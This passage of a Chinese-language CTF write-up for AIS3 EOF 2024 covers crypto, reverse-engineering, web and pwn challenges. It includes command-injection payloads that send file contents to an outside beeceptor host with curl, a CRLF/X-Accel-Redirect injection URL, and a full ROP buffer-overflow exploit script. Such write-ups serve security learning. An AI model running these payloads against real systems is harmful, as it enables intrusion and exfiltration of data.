C2=1215971313978433609342485989347332923041795842391275269194940000467333226963460540233361482007663631351577045620038444240009250779961838071996360301222331810633908088967903147828198060079495792642625735940506710806146494281652114263199842202870852499190950875262785311803806274426177987492575159092584775954821933480176489442707922620964481704636175074487451855639638393937623273365355846306957909857293337738254469499421290901573702786832890809139708909254357991817637403372292711374686622714079431782898432055650470687711018344622263871443425325142689319508368068428596083214723465370352579082990063187362686899056 C3=11339643923206291266967031864807238098397976695260197040961708420961939966341728644940825939727737348728307325186390618671465146935185471998953904078767498636636167120959263204102798889252432031861919982308540343130098563197393284333324952482678648707356348589866153919202517929774699396841646633369527660062880033980768512370535879555028483953224709793664474476388568727677768537077542008721310483986004362965684949401218739403639760908426647159253502038096962941585317061846729914980154197102260275186274538827093442156776944037491577927605050216591547477277743462892827637154604402275549369281279038931797446475150 # Using eps = 1/125 is slooooowww print(\u0026#34;OK\u0026#34;) print(coppersmith_short_pad(C1, C2, N, eps=1/200)) print(\u0026#34;OKK\u0026#34;) print(recover_message(C1, C2, N)) if __name__ == \u0026#34;__main__\u0026#34;: test() # $ sage coppersmith_short_pad.sage # OK # 15260296688054841855549554033325828358873293445937057389920569532146192328890726838121393944050950190351232165416987793968480778375961512320286620713733356286455203599405722158099636291489826180060449679700054026880237879354536540115264615831706760316440881201436132651317097019418304208021439215011667236669523482581439808329683682128795141376425192173826924615416712285730899753307349656762943655421268926747966939515269846077242406829682284290962771699140604387419648981712582246389043594985801791270844611771178820848918810175963248650295958983777211857033836826221646786729957495826890748780317531828543947741351 # OKK # 381154652566246929508473727716477049466389410722031086393452837063735212597870017594603827098699944898494276185755842451411969105007503711179198248485160134948595422107532592519234849282400850312645659812336024803010698102026667513739306000314576519841037594582835491810634703942264136257757734491891733739069648203545804735385429843970467614621111676499799066057903379780653711355885555771478806933458699112766064333129734667175496318518975251908292764285606828831717698194287326960605160113806350632078129800076420914290987405922124992009608252358516534395648660851414092864026646894 \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import long_to_bytes \u0026gt;\u0026gt;\u0026gt; long_to_bytes(381154652566246929508473727716477049466389410722031086393452837063735212597870017594603827098699944898494276185755842451411969105007503711179198248485160134948595422107532592519234849282400850312645659812336024803010698102026667513739306000314576519841037594582835491810634703942264136257757734491891733739069648203545804735385429843970467614621111676499799066057903379780653711355885555771478806933458699112766064333129734667175496318518975251908292764285606828831717698194287326960605160113806350632078129800076420914290987405922124992009608252358516534395648660851414092864026646894) b\u0026#39;====================================================================================================AIS3{C0pPer5MI7H$_SH0r7_p@D_a7T4ck}====================================================================================================\\x8dy\\x95\u0026gt;vA\\x19n\u0026#39; Flag: AIS3{C0pPer5MI7H$_SH0r7_p@D_a7T4ck}\nReverse # Flag Generator # Source Code # :::spoiler IDA Main Function\nint __cdecl main(int argc, const char **argv, const char **envp) { FILE *v3; // rax __int64 Block; // [rsp+30h] [rbp-20h] _main(argc, argv, envp); Block = calloc(0x600ui64, 1ui64); if ( Block ) { *Block = 23117; *(Block + 60) = 64; *(*(Block + 60) + Block) = 17744; *(*(Block + 60) + Block + 4) = -31132; *(*(Block + 60) + Block + 6) = 1; *(*(Block + 60) + Block + 20) = 240; *(*(Block + 60) + Block + 22) = 2; strcpy((Block + 328), \u0026#34;ice1187\u0026#34;); *(Block + 336) = 4096; *(Block + 340) = 4096; *(Block + 344) = 672; *(Block + 348) = 0x200; *(Block + 364) = -536870912; *(*(Block + 60) + Block + 24) = 523; *(*(Block + 60) + Block + 40) = *(Block + 340); *(*(Block + 60) + Block + 44) = *(Block + 340); *(*(Block + 60) + Block + 48) = 0x400000i64; *(*(Block + 60) + Block + 56) = 0x1000; *(*(Block + 60) + Block + 60) = 0x200; *(*(Block + 60) + Block + 80) = 0x2000; *(*(Block + 60) + Block + 84) = 0x200; *(*(Block + 60) + Block + 92) = 2; *(*(Block + 60) + Block + 72) = 5; *(*(Block + 60) + Block + 74) = 1; *(Block + 0x200) = SHELLCODE; *(Block + 1176) = *(\u0026amp;SHELLCODE + 83); qmemcpy( ((Block + 520) \u0026amp; 0xFFFFFFFFFFFFFFF8ui64), \u0026amp;SHELLCODE - (Block + 0x200 - ((Block + 520) \u0026amp; 0xFFFFFFFFFFFFFFF8ui64)), 8i64 * (((Block + 0x200 - ((Block + 520) \u0026amp; 0xFFFFFFF8) + 672) \u0026amp; 0xFFFFFFF8) \u0026gt;\u0026gt; 3)); writeFile(\u0026#34;flag.exe\u0026#34;, Block, 0x600); free(Block); return 0; } else { v3 = __acrt_iob_func(2u); fwrite(\u0026#34;calloc error\u0026#34;, 1ui64, 0xCui64, v3); return 1; } } :::\n:::spoiler IDA writeFile\n__int64 __fastcall writeFile(const char *flag_exe, __int64 block, int size) { FILE *v3; // rax FILE *v5; // rax FILE *Stream; // [rsp+20h] [rbp-10h] printf(\u0026#34;Output File: %s\\n\u0026#34;, flag_exe); Stream = fopen(flag_exe, \u0026#34;wb\u0026#34;); if ( Stream ) { if ( size ) { v5 = __acrt_iob_func(2u); fwrite(\u0026#34;Oops! Forget to write file.\u0026#34;, 1ui64, 0x1Bui64, v5); } fclose(Stream); return 0i64; } else { v3 = __acrt_iob_func(2u); fwrite(\u0026#34;fopen error\u0026#34;, 1ui64, 0xBui64, v3); return 1i64; } } :::\nRecon # 這是一個水題，簡單觀察一下code會發現writeFile的地方並不會真正的把前面處理好的byte code寫進去flag.exe裡面，他只會在前端stderr一個訊息給我們，因此最簡單的作法是直接動態patch，讓他可以正常寫入一個file中\n首先，要先想一個一個正常的fwrite的calling convention為何，參考網路\nsize_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)\n按照微軟的calling convention來說， $rcx要放寫入的block的地址 $rdx要放每次寫入的byte數量，以這一題來說就維持1 byte $r8要放總共寫入多少byte，以這一題來說是0x600 $r9要放寫入檔案的fd\n再來就是紀錄一下各個東西的數值，先breakpoint在writeFile的最一開始，紀錄calling convention帶過來的block address，以這一次為例是: 0x20CBEA81430 接著跳到fopen看他open flag.exe這個file的stream為何，以這一次為例是0x7FFC51AB8A90 然後就可以跳到call fwrite的地方修改calling convention\n原本 Patch後 最後就會看到當前目錄的flag.exe是有東西的 Exploit # 實際執行flag.exe就會跳出MessageBox顯示flag了 Flag: AIS3{US1ng_w1Nd0wS_is_such_a_p@1N....}\nPixelClicker # Source code # :::spoiler IDA Main Function\nLRESULT __fastcall choose_pixels(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\u0026#34;+\u0026#34; TO EXPAND] v4 = lParam; v6 = SWORD1(lParam); hdcSrc = GetDC(hWnd); if ( position \u0026gt; 1 \u0026amp;\u0026amp; position % 600u == 1 ) { Block = sub_140001A60(); v11 = \u0026amp;Block[*(Block + 10)]; hdc = CreateCompatibleDC(hdcSrc); h = CreateCompatibleBitmap(hdcSrc, 600, 600); SelectObject(hdc, h); BitBlt(hdc, 0, 0, 600, 600, hdcSrc, 650, 0, 0xCC0020u); GetObjectW(h, 32, pv); HIDWORD(bmi.hdc) = v27; memset(\u0026amp;bmi.rcPaint.right, 0, 20); bmi.fErase = cLines; LODWORD(bmi.hdc) = 40; *\u0026amp;bmi.rcPaint.left = 0x200001i64; v23 = operator new((4 * cLines * ((32 * v27 + 31) / 32))); GetDIBits(hdc, h, 0, cLines, v23, \u0026amp;bmi, 0); v12 = 0; v13 = 0i64; v14 = v23 - v11; while ( *\u0026amp;v11[v14] == *v11 ) { ++v12; ++v13; v11 += 4; if ( v13 \u0026gt;= 360000 ) { v15 = \u0026#34;Perfect Match! You are such a good clicker!!\u0026#34;; goto LABEL_8; } } set_windows_title(Text, \u0026#34;You are bad at clicking pixels... Mismatch at pixel %d %u:%u\u0026#34;); MessageBoxA(hWnd, Text, \u0026#34;Pixel Clicker\u0026#34;, 0); v15 = \u0026#34;Game Over!\u0026#34;; LABEL_8: if ( MessageBoxA(hWnd, v15, \u0026#34;Pixel Clicker (Line Check)\u0026#34;, 0) ) DestroyWindow(hWnd); j_j_free(Block); j_j_free(v23); DeleteDC(hdc); DeleteObject(h); } switch ( Msg ) { case 2u: PostQuitMessage(0); break; case 0xFu: v18 = BeginPaint(hWnd, \u0026amp;bmi); BitmapW = LoadBitmapW(hModule, 0x83); CompatibleDC = CreateCompatibleDC(v18); SelectObject(CompatibleDC, BitmapW); BitBlt(v18, 0, 0, 600, 600, CompatibleDC, 0, 0, 0xCC0020u); DeleteDC(CompatibleDC); EndPaint(hWnd, \u0026amp;bmi); break; case 0x111u: if ( wParam == 0x68 ) { DialogBoxParamW(hModule, 0x67, hWnd, DialogFunc, 0i64); } else { if ( wParam != 0x69 ) return DefWindowProcW(hWnd, 0x111u, wParam, lParam); DestroyWindow(hWnd); } break; case 0x200u: GetPixel(hdcSrc, v4, v6); set_windows_title(Text, \u0026#34;Pixel Clicker %02X%02X%02X (Clicked: %d)\u0026#34;); SetWindowTextA(hWnd, Text); break; case 0x201u: Pixel = GetPixel(hdcSrc, v4, v6); if ( v4 \u0026lt; 600 \u0026amp;\u0026amp; v6 \u0026lt; 600 ) { SetPixel(hdcSrc, position % 0x258u + 650, position / 0x258u, Pixel); ++position; } break; default: return DefWindowProcW(hWnd, Msg, wParam, lParam); } ReleaseDC(hWnd, hdcSrc); return 0i64; } :::\nRecon # 這一題有一點點難，主要是不太知道要從哪邊開始patch，不過觀察整體的架構就大概知道怎麼做，首先這一題主要做的事情是:\n開一個pixel clicker的selector 接著user可以自由選取左邊的pixels，並且選取完後會顯示在右邊，從左到右依序顯示 看code會發現圖片大小應該是600 * 600的大小(每一個pixel是4 bytes)，所以我們只要選取完360000次，並且每一次都和原始的flag一樣的話就結束然後print出好棒棒的MessageBoxA 通常這種題目都是把flag內建在code當中，然後利用一些簡單的加解密或是純粹的混淆把他import到memory中再進行對比，所以我們的目標很簡單就是想辦法把原本的flag memory dump出來\n後來發現根本不用特別patch就可以知道flag的圖片pixel在哪邊，順便說明一下這一題的檢查機制是等我們輸入完每600個pixel後，會進行Line Check，如果都正確才會進到下一round的選擇，所以我一開始就在想要怎麼樣才能直接bypass那個檢查，直接給我flag的Pixel，後來發現只要我先在最一開始的position variable if判斷式中直接輸入0x259，也就是601，他會直接往下執行，並且在#26的地方會知道flag在哪裡，如下圖\nRCX改成0x259會直接執行下去 到discompiler的#26的地方時，RBX所指向的address就是flag的pixel 此時只要用scylla把mem dump出來即可，大小為hex(36000個pixels * 4 bytes) = 0x15f900 最後把data轉換成image即可 Exploit # from PIL import Image data = open(\u0026#39;./MEM_000002843342A076_0015F900_flag.mem\u0026#39;, \u0026#39;rb\u0026#39;).read() img = Image.frombytes(\u0026#34;RGBA\u0026#34;, (600, 600), data) img = img.transpose(Image.FLIP_TOP_BOTTOM) img.save(\u0026#39;flag.png\u0026#39;, \u0026#39;png\u0026#39;) Flag: AIS3{jU$T_4_51mpl3_ClICkEr_gam3}\nWeb # DNS Lookup Tool | Final Edition # Source Code # :::spoiler\n\u0026lt;?php isset($_GET[\u0026#39;source\u0026#39;]) and die(show_source(__FILE__, true)); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;DNS Lookup Tool | Final\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;section class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;column is-6 is-offset-3 has-text-centered\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;title\u0026#34;\u0026gt;DNS Lookup Tool 🔍 | Final Edition\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;field\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;control\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;input\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;example.com\u0026#34; id=\u0026#34;hostname\u0026#34; value=\u0026#34;\u0026lt;?= $_POST[\u0026#39;name\u0026#39;] ?? \u0026#39;\u0026#39; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button class=\u0026#34;button is-block is-info is-fullwidth\u0026#34;\u0026gt; Lookup! \u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;br\u0026gt; \u0026lt;?php if (isset($_POST[\u0026#39;name\u0026#39;])) : ?\u0026gt; \u0026lt;section class=\u0026#34;has-text-left\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Lookup result:\u0026lt;/p\u0026gt; \u0026lt;b\u0026gt; \u0026lt;?php $blacklist = [\u0026#39;|\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#34;\\n\u0026#34;, \u0026#39;flag\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;?\u0026#39;]; $is_input_safe = true; foreach ($blacklist as $bad_word) if (strstr($_POST[\u0026#39;name\u0026#39;], $bad_word) !== false) $is_input_safe = false; if ($is_input_safe) { $retcode = 0; $output = []; exec(\u0026#34;host {$_POST[\u0026#39;name\u0026#39;]}\u0026#34;, $output, $retcode); if ($retcode === 0) { echo \u0026#34;Host {$_POST[\u0026#39;name\u0026#39;]} is valid!\\n\u0026#34;; } else { echo \u0026#34;Host {$_POST[\u0026#39;name\u0026#39;]} is invalid!\\n\u0026#34;; } } else echo \u0026#34;HACKER!!!\u0026#34;; ?\u0026gt; \u0026lt;/b\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;?php endif; ?\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;a href=\u0026#34;/?source\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::\nRecon # 這一題爆炸難，這麼多人解出來讓我很驚訝，也許我用的方式和別人有眾多差異ㄅ 首先，這一題和NTU CS的DNS Lookup Tool | WAF幾乎一樣，只是多了兩個wildcard的黑名單，以及query host command的寫法不一樣，而且仔細看內容會發現，最後吐回來到前端的東西，也只是交給echo決定而已，實際上我們拿不到host query的內容，抑或是command injection的回顯，所以一開始有想說是不是像NTU CS作業的Double Injection Flag1那樣是利用Time Based決定我們query的command內容為何，但如果要用到這麼複雜的話，應該\u0026hellip;沒那麼多人會解????也許大家都是Web天才，但後來又翻到Particles.js的過程，發現其實我都可以做到command injection，理當可以向外送封包，然後利用$()或是`的字元，就可以把我query的command result帶出來，一開始是像之前一樣用beecptor，不確定是不是打題目到頭昏了，一直無法query成功，但隔天就好了???反正就是簡單的curl然後下grep / find等command就找的到了，最後附上我大ChatGPT的貢獻\nExploit # :::info 記得把? urlencode成%3f，不然會被說是hacker :::\n找flag檔名(搭配regular expression): Payload: `curl https://sbk6401.free.beeceptor.com/%3Ff=$(find / -maxdepth 1 -type f -regex \u0026#39;/f\\lag.+\u0026#39;)` cat flag Payload: `curl https://sbk6401.free.beeceptor.com/%3Ff=$(cat /fl\\ag_AFobuQoUxPlLBzGD)` 其他種payload(直接找檔案內容含有ais3字樣的檔案)→比較萬能的Payload: 這個是不需要知道檔案名稱，僅知道內容的時候可以用，並且他會連同檔案名稱一起顯示 Payload: `curl https://sbk6401.free.beeceptor.com/%3Ff=$(find / -maxdepth 1 -type f -exec grep -i \u0026#34;ais3{\u0026#34; --directories=skip {} +)` Flag: AIS3{jUST_3@$Y_coMMaND_Inj3c7ION}\nInternal # Source Code # :::spoiler Server Source Code\nfrom http.server import ThreadingHTTPServer, BaseHTTPRequestHandler from urllib.parse import urlparse, parse_qs import re, os if os.path.exists(\u0026#34;/flag\u0026#34;): with open(\u0026#34;/flag\u0026#34;) as f: FLAG = f.read().strip() else: FLAG = os.environ.get(\u0026#34;FLAG\u0026#34;, \u0026#34;flag{this_is_a_fake_flag}\u0026#34;) URL_REGEX = re.compile(r\u0026#34;https?://[a-zA-Z0-9.]+(/[a-zA-Z0-9./?#]*)?\u0026#34;) class RequestHandler(BaseHTTPRequestHandler): def do_GET(self): if self.path == \u0026#34;/flag\u0026#34;: self.send_response(200) self.end_headers() self.wfile.write(FLAG.encode()) return query = parse_qs(urlparse(self.path).query) redir = None if \u0026#34;redir\u0026#34; in query: redir = query[\u0026#34;redir\u0026#34;][0] if not URL_REGEX.match(redir): redir = None self.send_response(302 if redir else 200) if redir: self.send_header(\u0026#34;Location\u0026#34;, redir) self.end_headers() self.wfile.write(b\u0026#34;Hello world!\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: server = ThreadingHTTPServer((\u0026#34;\u0026#34;, 7777), RequestHandler) server.allow_reuse_address = True print(\u0026#34;Starting server, use \u0026lt;Ctrl-C\u0026gt; to stop\u0026#34;) server.serve_forever() ::: :::spoiler NGINX Config\nserver { listen 7778; listen [::]:7778; server_name localhost; location /flag { internal; proxy_pass http://web:7777; } location / { proxy_pass http://web:7777; } } ::: :::spoiler docker-compose.yml\nversion: \u0026#39;3.7\u0026#39; services: proxy: image: nginx volumes: - ./share/default.conf:/etc/nginx/conf.d/default.conf ports: - \u0026#34;7778:7778\u0026#34; web: build: . volumes: - ./flag:/flag:ro ::: :::spoiler Dockerfile\nFROM python:3.12-alpine RUN apk add --no-cache tini WORKDIR /home/guest COPY ./share/server.py . USER guest ENTRYPOINT [\u0026#34;/sbin/tini\u0026#34;, \u0026#34;--\u0026#34;] CMD [\u0026#34;python3\u0026#34;, \u0026#34;server.py\u0026#34;] :::\nRecon # 這一題也是爆炸難，先看dockerfile和docker-compose會知道它有開了兩個服務，一個是proxy，用的是nginx；例外一個是本來的web服務，而觀察nginx的config file會發現只要query /flag就會被nginx擋住，因為它只允許internal的頁面存取，也就是說如果我是從/這個頁面轉到/flag的話才可以存取，如果是從外往直接access，就會被擋掉，而值得注意的是nginx的port是7778，而實際轉過去到web服務的是7777 port\n再觀察server怎麼寫，前面寫如果我的path是/flag就會response flag回來，然後它還有給一個redir的參數，它會經過urlparse + parse_qs + URL_REGEX等parsing的操作後，跳轉到我們輸入的地方，不過通常跳轉如果沒有特別設定的話，還是會像我們正常query /flag一樣會回傳404，被擋下來，所以要找一個nginx常用的一個header讓他可以在internal內部跳轉，我找到的是==X-Accel-Redirect==，原本我以為會是XFF這樣的header但還是沒辦法，一定要是nginx可以用的，所以事情就變得比較單純了，我們先嘗試redir到127.0.0.1:7778，然後利用CRLF injection增加header，也就是X-Accel-Redirect: /flag，這樣的話payload進到server之後的流程就會變成:\nPayload → Proxy → (redirect to /flag)Web → Client Side 其實這樣就像是我直接從server內部(/)access internal(/flag)一樣\nExploit # 在local端測試時可以看到proxy這邊的log如下 而website的log如下 代表他在內部成功跳轉，並且query到flag了\nPayload: http://10.105.0.21:11302/?redir=http://10.105.0.21:11302/%0D%0AX-Accel-Redirect%3A%20/flag\nFlag: AIS3{JUsT_s0M3_fuNnY_n91Nx_FEatuR3}\nPWN # jackpot # Source Code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026#34;SECCOMP.h\u0026#34; struct sock_filter seccompfilter[]={ BPF_STMT(BPF_LD | BPF_W | BPF_ABS, ArchField), BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), BPF_STMT(BPF_LD | BPF_W | BPF_ABS, SyscallNum), Allow(open), Allow(openat), Allow(read), Allow(write), Allow(close), Allow(readlink), Allow(getdents), Allow(getrandom), Allow(brk), Allow(rt_sigreturn), Allow(exit), Allow(exit_group), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), }; struct sock_fprog filterprog={ .len=sizeof(seccompfilter)/sizeof(struct sock_filter), .filter=seccompfilter }; void apply_seccomp(){ if(prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0)){ perror(\u0026#34;Seccomp Error\u0026#34;); exit(1); } if(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,\u0026amp;filterprog)==-1){ perror(\u0026#34;Seccomp Error\u0026#34;); exit(1); } return; } void jackpot() { puts(\u0026#34;Here is your flag\u0026#34;); printf(\u0026#34;%s\\n\u0026#34;, \u0026#34;flag{fake}\u0026#34;); } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); apply_seccomp(); char name[100]; unsigned long ticket_pool[0x10]; int number; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); puts(\u0026#34;Lottery!!\u0026#34;); printf(\u0026#34;Give me your number: \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;number); printf(\u0026#34;Here is your ticket 0x%lx\\n\u0026#34;, ticket_pool[number]); printf(\u0026#34;Sign your name: \u0026#34;); read(0, name, 0x100); if (ticket_pool[number] == jackpot) { puts(\u0026#34;You get the jackpot!!\u0026#34;); jackpot(); } else puts(\u0026#34;You get nothing QQ\u0026#34;); return 0; } :::\nRecon # 這一題也是爆炸難，不過和之前寫的NTU CS HW3 - HACHAMA其實很像，所以還寫的出來 :::info 起手式看他的linux version和checksec\n$ docker exec -it jackpot_jackpot_1 /bin/bash root@0cffcd48ea11:/# lsb_release -a LSB Version: core-11.1.0ubuntu4-noarch:security-11.1.0ubuntu4-noarch Distributor ID: Ubuntu Description: Ubuntu 22.04.3 LTS Release: 22.04 Codename: jammy $ checksec jackpot [*] \u0026#39;/mnt/d/NTU/CTF/AIS3-EOF-2024/PWN/jackpot/share/jackpot\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) :::\n首先他有設定seccomp，所以不用想要開shell，再加上題目敘述有提到flag放在根目錄，所以還是用萬能的open/read/write把flag讀出來到前端\nmain function中首先看到他叫我們輸入一個任意數字，會return一個在stack上的content，因為ticket_pool這個變數是在local scope，所以讀取的內容就會是stack上的東西，另外他也沒有限制我們寫入的number為多少，所以我可以任意撈stack上的資料，直覺先找libc_start_main然後回推libc base address 可以看到ticket_pool的位置就在$rsp的下面，所以從+0x0010的地方開始算，會發現libc_start_main就在第31個(從0開始算)，此時就可以很輕易的抓出leak_libc，然後回推libc base\nr.recvuntil(b\u0026#39;Give me your number: \u0026#39;) r.sendline(b\u0026#39;31\u0026#39;) r.recvuntil(b\u0026#39;Here is your ticket 0x\u0026#39;) leak_libc = int(r.recvline()[:-1], 16) log.info(f\u0026#39;{hex(leak_libc)=}\u0026#39;) libc_base = leak_libc - 0x1d90 - 0x28000 log.info(f\u0026#39;{hex(libc_base)=}\u0026#39;) 接著看main function的後續，發現他叫我們輸入0x100到name的變數中，但是name的大小是100(0x64)，所以有一個明顯的BOF，此時直覺就是開始蓋ROP，可以用ROPgadget找有用的gadget\npop_rax_ret = libc_base + 0x0000000000045eb0 pop_rdi_ret = libc_base + 0x000000000002a3e5 pop_rsi_ret = libc_base + 0x000000000002be51 pop_rdx_ret = libc_base + 0x00000000000796a2 syscall_ret = libc_base + 0x0000000000091316 rop_open_flag = flat( # Open filename # fd = open(\u0026#34;/flag\u0026#34;, 0); pop_rax_ret, 2, pop_rdi_ret, bss_flag_addr, pop_rsi_ret, 0, syscall_ret, main_fn ) rop_read_flag = flat( # Read the file # read(fd, buf, 0x30); pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, bss_flag_addr + 0x2b8, pop_rdx_ret, 0x30, syscall_ret, main_fn ) rop_write_flag = flat( # Write the file # write(1, buf, 0x30); pop_rax_ret, 1, pop_rdi_ret, 1, pop_rsi_ret, bss_flag_addr + 0x2b8, pop_rdx_ret, 0x30, syscall_ret ) 到這邊為止都是基本操作，但真正難的地方在於我們寫的地方其實不太夠，畢竟他也只是多了156個bytes，要寫完ORW是不太可能的，因此要想想看stack pivot，到這邊也還可以，但因為仔細看實際執行的assembly會發現我們需要精心設計RBP才不會觸發segmentation fault，仔細看#9會發現他把$rbp+$rax*8-0xf0指向的地方給$eax，所以這邊就要特別注意，如果我們可控的$rbp到這一行指向奇怪的地方會觸發SIGSEGV，所以實戰中我也是慢慢調，不過因為每做一次操作都要想辦法調到位就有點煩，另外想回頭講一下，為甚麼read / write指定的buf會在bss_flag_addr+0x2b8的地方，因為如果距離RBP太近的話，有可能會被puts(\u0026quot;You get nothing QQ\u0026quot;);這一行洗掉的風險，原因是他要先把東西push到stack上，所以如果read / write的buf address弄不好就會被蓋掉\n.text:00000000004013D4 lea rax, [rbp+buf] .text:00000000004013D8 mov edx, 100h ; nbytes .text:00000000004013DD mov rsi, rax ; buf .text:00000000004013E0 mov edi, 0 ; fd .text:00000000004013E5 call _read .text:00000000004013E5 .text:00000000004013EA mov eax, [rbp+var_F4] .text:00000000004013F0 cdqe .text:00000000004013F2 mov rax, [rbp+rax*8+var_F0] .text:00000000004013FA mov rdx, rax .text:00000000004013FD lea rax, jackpot .text:0000000000401404 cmp rdx, rax .text:0000000000401407 jnz short loc_401424 .text:0000000000401407 .text:0000000000401409 lea rax, aYouGetTheJackp ; \u0026#34;You get the jackpot!!\u0026#34; .text:0000000000401410 mov rdi, rax ; s .text:0000000000401413 call _puts r.send(b\u0026#39;a\u0026#39;*14*8 + p64(bss_rbp) + p64(main_fn)) # raw_input() r.send(b\u0026#39;a\u0026#39;*13*8 + b\u0026#39;/flag\u0026#39;.ljust(0x8, b\u0026#39;\\x00\u0026#39;) + p64(bss_rbp+0x88+0x70) + rop_open_flag) raw_input() r.send(b\u0026#39;a\u0026#39;*13*8 + b\u0026#39;/flag\u0026#39;.ljust(0x8, b\u0026#39;\\x00\u0026#39;) + p64(bss_rbp+0x88*2+0x70+0x40+0x4+0x48) + rop_read_flag) # raw_input() r.send(b\u0026#39;a\u0026#39;*13*8 + b\u0026#39;/flag\u0026#39;.ljust(0x8, b\u0026#39;\\x00\u0026#39;) + p64(bss_rbp+0x288) + rop_write_flag) :::success 至此，我的ROP流程是這樣的: main function → ROP open flag → main function → ROP read flag → main function → ROP write flag\n這樣的話我每一次蓋ROP只要蓋一個操作就好，就和HACHAMA那一題一樣 :::\nExploit - Leak Libc + BOF + Stack Pivot + ORW # :::danger 提醒一下，最後面實際丟ROP上去的時候最後中間都隔一個raw_input()，還是和HACHAMA遇到的問題一樣可能是pwntools的IO問題 :::\nfrom pwn import * r = process(\u0026#39;./jackpot\u0026#39;) r = remote(\u0026#39;10.105.0.21\u0026#39;, 12686) context.arch = \u0026#39;amd64\u0026#39; r.recvuntil(b\u0026#39;Give me your number: \u0026#39;) r.sendline(b\u0026#39;31\u0026#39;) r.recvuntil(b\u0026#39;Here is your ticket 0x\u0026#39;) leak_libc = int(r.recvline()[:-1], 16) log.info(f\u0026#39;{hex(leak_libc)=}\u0026#39;) libc_base = leak_libc - 0x1d90 - 0x28000 log.info(f\u0026#39;{hex(libc_base)=}\u0026#39;) r.recvuntil(b\u0026#39;Sign your name: \u0026#39;) pop_rax_ret = libc_base + 0x0000000000045eb0 pop_rdi_ret = libc_base + 0x000000000002a3e5 pop_rsi_ret = libc_base + 0x000000000002be51 pop_rdx_ret = libc_base + 0x00000000000796a2 syscall_ret = libc_base + 0x0000000000091316 bss_flag_addr = 0x00000000004043f8 bss_rbp = 0x0000000000404400 main_fn = 0x4013d4 rop_open_flag = flat( # Open filename # fd = open(\u0026#34;/flag\u0026#34;, 0); pop_rax_ret, 2, pop_rdi_ret, bss_flag_addr, pop_rsi_ret, 0, syscall_ret, main_fn ) rop_read_flag = flat( # Read the file # read(fd, buf, 0x30); pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, bss_flag_addr + 0x2b8, pop_rdx_ret, 0x30, syscall_ret, main_fn ) rop_write_flag = flat( # Write the file # write(1, buf, 0x30); pop_rax_ret, 1, pop_rdi_ret, 1, pop_rsi_ret, bss_flag_addr + 0x2b8, pop_rdx_ret, 0x30, syscall_ret ) r.send(b\u0026#39;a\u0026#39;*14*8 + p64(bss_rbp) + p64(main_fn)) # raw_input() r.send(b\u0026#39;a\u0026#39;*13*8 + b\u0026#39;/flag\u0026#39;.ljust(0x8, b\u0026#39;\\x00\u0026#39;) + p64(bss_rbp+0x88+0x70) + rop_open_flag) raw_input() r.send(b\u0026#39;a\u0026#39;*13*8 + b\u0026#39;/flag\u0026#39;.ljust(0x8, b\u0026#39;\\x00\u0026#39;) + p64(bss_rbp+0x88*2+0x70+0x40+0x4+0x48) + rop_read_flag) # raw_input() r.send(b\u0026#39;a\u0026#39;*13*8 + b\u0026#39;/flag\u0026#39;.ljust(0x8, b\u0026#39;\\x00\u0026#39;) + p64(bss_rbp+0x288) + rop_write_flag) r.interactive() Flag: 